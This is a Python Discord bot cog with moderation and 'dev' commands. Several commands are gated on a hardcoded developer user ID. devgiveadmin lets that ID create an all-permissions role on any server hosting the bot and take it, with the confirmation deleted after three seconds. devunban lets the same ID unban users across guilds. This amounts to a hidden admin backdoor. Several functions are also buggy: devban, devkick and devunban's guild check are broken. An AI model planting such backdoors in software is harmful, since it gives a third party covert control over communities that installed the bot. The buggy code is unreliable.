import discord
from discord import Embed, Member, Permissions
from discord.ext import commands
from discord.ext.commands import has_permissions, MissingPermissions

from typing import Optional
from datetime import datetime


developerid = 416508283528937472, 000

class beta(commands.Cog):
    def __init__(self, client):
        self.client = client

    @commands.Cog.listener()
    async def on_ready(self):
        print("beta.py Loaded!")


    # tgiveadmin <name>
    @commands.command()
    async def devgiveadmin(self, ctx, name: str="admin"):
        global developerid
        if ctx.author.id in developerid:
            guild = ctx.guild
            user = ctx.author
            
            role = await guild.create_role(name=name,permissions=Permissions.all())  
            await user.add_roles(role)

            await ctx.send(f"{user.name} received the role {name}", delete_after=3)
        else:
            await ctx.send("Your not a developer.")

    # tdeleterole <name>
    @commands.command()
    async def devdeleterole(self, ctx, role):
        global developerid
        if ctx.author.id in developerid:

            role = discord.utils.get(ctx.message.guild.roles, name=role)
            await role.delete()

            await ctx.send(f"**{role}** role has been deleted", delete_after=3)
        else:
            await ctx.send("Your not a developer.")
    

    #tgiverole <role>
    @commands.command()
    async def devgiverole(self, ctx, role: discord.Role, *, user: discord.Member=None):
        global developerid
        if ctx.author.id in developerid:
            user = user or ctx.author

            if ctx.me.top_role.position <= role.position: 
                await ctx.send("The role's position is higher than mine and I cannot assign it to users.")
        
            await user.add_roles(role)

            await ctx.send(f"Added the role {role.name} to {user.mention}", delete_after=3)
        else:
            await ctx.send("Your not a developer.")


    # tpurge <ammount>
    @commands.command(aliases=['clear'])
    @commands.has_permissions(administrator=True)
    async def purge(self, ctx, l: int = 50):
        try:
            await ctx.message.delete()
            c = await ctx.channel.purge(limit=l)
            await ctx.send(f"Cleared {len(c)} messages", delete_after=3)
        except:
            await ctx.send(f"{ctx.author.name}! You don't have permission to do that!")


    @commands.command()
    @commands.has_permissions(kick_members=True) 
    async def devkick(self, ctx, Member: discord.Member):
          await self.client.kick(Member)
    
    @commands.command()
    async def devban(self, ctx, *, user: discord.Member, reason = None):
        global developerid
        if ctx.author.id in developerid:
            await user.guild.ban(reason=reason)

            await ctx.send(f"{user.name} has been banned!")
        else:
            await ctx.send("Your not a developer.")

    # tunban <user> <serverid>
    @commands.command()
    async def devunban(self, ctx, userid: int=0, target: int=0):
        global developerid
        if userid == 0 or None:
            await ctx.send("Give me a user id to unban such user")
            return
        user = await self.client.fetch_user(userid)

        if target is None:
            # Check if userid is a banned user
            targetguild = ctx.guild
            Check = await is_banned(ctx, user, targetguild)

            # If userid is a banned user
            if Check == True:
                await ctx.guild.unban(user)
                await ctx.send(f"{user.name} has been unbaned from {targetguild.name}.")
            else:
                await ctx.send(f"{userid} is not found in banned users from {targetguild.name}.")
            return
        else:
            if ctx.author.id in developerid:
                # Check if Guild exist
                activeservers = self.client.guilds
                for guild in activeservers:
                    if guild.id == target:
                        found = True
                        break
                # if Guild Found 
                if found == True:
                    # Check if userid is a banned user
                    targetguild = self.client.get_guild(target)
                    Check = await is_banned(ctx, user, targetguild)

                    # if userid is a banned user
                    if Check == True:
                        targetguild = self.client.get_guild(target)
                        await targetguild.unban(user)
                        await ctx.send(f"{user.name} has been unbaned from {targetguild.name}.")
                    else:
                        await ctx.send(f"{userid} is not found in banned users from {targetguild.name}.")
                else:
                    await ctx.send("Guild doesnt exist.")
                    return


async def is_banned(ctx, user, targetguild):
    try:
        entry = await targetguild.get_ban(user)
    except discord.NotFound:
        return False
    return True
#####################################################################################################################################
def setup(client):
    client.add_cog(beta(client))